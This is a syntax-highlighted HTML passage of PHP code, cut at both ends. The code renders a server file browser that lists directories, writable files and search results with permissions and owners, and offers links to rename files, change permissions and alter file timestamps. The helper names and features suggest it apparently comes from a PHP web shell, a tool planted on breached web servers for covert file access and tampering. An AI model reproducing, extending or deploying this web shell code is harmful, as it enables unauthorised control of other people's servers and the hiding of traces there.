<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">view_writable</span> == <span style="color: #3e999f;">'file'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span> = <span style="color: #4d4d4c; background-color: #ffffff;">GetWFileList(</span>$<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">findstr</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span> = <span style="color: #4d4d4c; background-color: #ffffff;">GetSFileList(</span>$<span style="color: #eab700;">nowpath</span>, $<span style="color: #eab700;">findstr</span>, $<span style="color: #eab700;">re</span>);
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#30446;&#24405;&#21015;&#34920;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">scandir()&#25928;&#29575;&#26356;&#39640;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirs</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">opendir(</span>$<span style="color: #eab700;">dir</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span> ($<span style="color: #eab700;">file</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">readdir(</span>$<span style="color: #eab700;">dirs</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filepath</span>=$<span style="color: #eab700;">nowpath</span><span style="color: #c82829; font-weight: bold;">.</span>$<span style="color: #eab700;">file</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(@<span style="color: #4d4d4c; background-color: #ffffff;">is_dir(</span>$<span style="color: #eab700;">filepath</span>)){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'filename'</span>]=$<span style="color: #eab700;">file</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'mtime'</span>]=<span style="color: #718c00;">@date</span>(<span style="color: #3e999f;">'Y-m-d H:i:s'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">filemtime(</span>$<span style="color: #eab700;">filepath</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'dirchmod'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getChmod(</span>$<span style="color: #eab700;">filepath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'dirperm'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getPerms(</span>$<span style="color: #eab700;">filepath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'fileowner'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getUser(</span>$<span style="color: #eab700;">filepath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'dirlink'</span>]=$<span style="color: #eab700;">nowpath</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'server_link'</span>]=$<span style="color: #eab700;">filepath</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span>[]=$<span style="color: #eab700;">dirdb</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {<span style="color: #c82829; background-color: #d6d6d6;">        </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'filename'</span>]=$<span style="color: #eab700;">file</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'size'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">sizecount(</span>@<span style="color: #4d4d4c; background-color: #ffffff;">filesize(</span>$<span style="color: #eab700;">filepath</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'mtime'</span>]=<span style="color: #718c00;">@date</span>(<span style="color: #3e999f;">'Y-m-d H:i:s'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">filemtime(</span>$<span style="color: #eab700;">filepath</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'filechmod'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getChmod(</span>$<span style="color: #eab700;">filepath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'fileperm'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getPerms(</span>$<span style="color: #eab700;">filepath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'fileowner'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getUser(</span>$<span style="color: #eab700;">filepath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'dirlink'</span>]=$<span style="color: #eab700;">nowpath</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'server_link'</span>]=$<span style="color: #eab700;">filepath</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[]=$<span style="color: #eab700;">filedb</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">while</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">unset(</span>$<span style="color: #eab700;">dirdb</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">unset(</span>$<span style="color: #eab700;">filedb</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">closedir(</span>$<span style="color: #eab700;">dirs</span>);
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">sort(</span>$<span style="color: #eab700;">dirdata</span>);
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">sort(</span>$<span style="color: #eab700;">filedata</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dir_i</span> = <span style="color: #3e999f;">'0'</span>;

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;form id="filelist" name="filelist" action="'</span>.$<span style="color: #eab700;">self</span>.<span style="color: #3e999f;">'" method="post"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'file'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'thefile'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'doing'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>,$<span style="color: #eab700;">nowpath</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">dirdata</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">key</span> =&gt; $<span style="color: #eab700;">dirdb</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'filename'</span>]!=<span style="color: #3e999f;">'..'</span> &amp;&amp; $<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'filename'</span>]!=<span style="color: #3e999f;">'.'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">getdir</span> &amp;&amp; $<span style="color: #eab700;">getdir</span> == $<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'server_link'</span>]) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">attachsize</span> = <span style="color: #4d4d4c; background-color: #ffffff;">dirsize(</span>$<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'server_link'</span>]);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">attachsize</span> = <span style="color: #4d4d4c; background-color: #ffffff;">is_numeric(</span>$<span style="color: #eab700;">attachsize</span>) ? <span style="color: #4d4d4c; background-color: #ffffff;">sizecount(</span>$<span style="color: #eab700;">attachsize</span>) :<span style="text-decoration: underline;"> </span><span style="color: #3e999f; text-decoration: underline;">'Unknown'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">attachsize</span> = <span style="color: #3e999f;">'&lt;a href="javascript:getsize(\''</span>.$<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'server_li</span><span style="color: #3e999f; text-decoration: underline;">nk'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;Stat&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">thisbg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.$<span style="color: #eab700;">thisbg</span>.<span style="color: #3e999f;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #3e999f; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;&lt;a href="javascript:godir(\''</span>.$<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'server_link'</span>].<span style="color: #3e999f;">'\');"&gt;'</span>.<span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'ser</span><span style="color: #3e999f; text-decoration: underline;">ver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td nowrap&gt;'</span>.$<span style="color: #eab700;">attachsize</span>.<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td nowrap&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'server_link'</span>].<span style="color: #3e999f;">'\');"&gt;'</span>.$<span style="color: #eab700; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'dirchmod'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;a href="javascript:fileperm(\''</span>.$<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'server_link'</span>].<span style="color: #3e999f;">'\');"&gt;'</span>.$<span style="color: #eab700; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'dirperm'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dirdb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td nowrap&gt;&lt;a href="javascript:rename(\''</span>.$<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'server_link'</span>].<span style="color: #3e999f;">'</span><span style="color: #3e999f; text-decoration: underline;">\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dir_i</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">dirdb</span>[<span style="color: #3e999f;">'filename'</span>]==<span style="color: #3e999f;">'..'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class='</span>.<span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>).<span style="color: #3e999f;">'&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="java</span><span style="color: #3e999f; text-decoration: underline;">script:godir(\''</span><span style="text-decoration: underline;">.</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">getUpPath(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px </span><span style="color: #3e999f; text-decoration: underline;">solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">file_i</span> = <span style="color: #3e999f;">'0'</span>;

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">filedata</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">key</span> =&gt; $<span style="color: #eab700;">filedb</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'filename'</span>]!=<span style="color: #3e999f;">'..'</span> &amp;&amp; $<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'filename'</span>]!=<span style="color: #3e999f;">'.'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fileurl</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span>$<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">"DOCUMENT_ROOT"</span>],<span style="color: #3e999f;">''</span>,$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'server_</span><span style="color: #3e999f; text-decoration: underline;">link'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">thisbg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.$<span style="color: #eab700;">thisbg</span>.<span style="color: #3e999f;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #3e999f; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.((<span style="color: #4d4d4c; background-color: #ffffff;">strpos(</span>$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'server_link'</span>], $<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">"DOCUMENT_ROOT"</span>])<span style="text-decoration: underline;"> !== </span><span style="color: #4271ae; text-decoration: underline;">false</span><span style="text-decoration: underline;">) ? </span><span style="color: #3e999f; text-decoration: underline;">'&lt;a href="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">fileurl</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'" target="_blank"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;"> : $</span><span style="color: #eab700; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">]).</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'se</span><span style="color: #3e999f; text-decoration: underline;">rver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td nowrap&gt;'</span>.$<span style="color: #eab700;">filedb</span>[<span style="color: #3e999f;">'size'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
